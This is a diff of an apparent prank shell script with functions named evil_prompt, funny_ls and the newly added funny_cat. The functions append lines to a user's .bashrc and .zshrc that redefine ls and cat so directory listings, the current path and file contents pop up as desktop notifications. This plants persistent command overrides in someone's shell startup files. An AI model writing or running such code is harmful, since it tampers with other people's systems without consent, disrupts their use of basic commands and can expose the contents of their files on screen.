@@ -14,8 +14,15 @@ function evil_prompt() {
 }
 
 function funny_ls() {
-  local cmd='function ls() { notify-send "$(command ls $@)"; }'
+  local cmd='function ls() { notify-send $PWD "$(command ls $@)"; }'
 
-  echo "$cmd" >>"$HOME"/.bashrc
-  echo "$cmd" >>"$HOME"/.zshrc
+  echo "$cmd" >>"$home"/.bashrc
+  echo "$cmd" >>"$home"/.zshrc
+}
+
+function funny_cat() {
+  local cmd='function cat() { notify-send "$(command cat $@)"; }'
+
+  echo "$cmd" >>"$home"/.bashrc
+  echo "$cmd" >>"$home"/.zshrc
 }
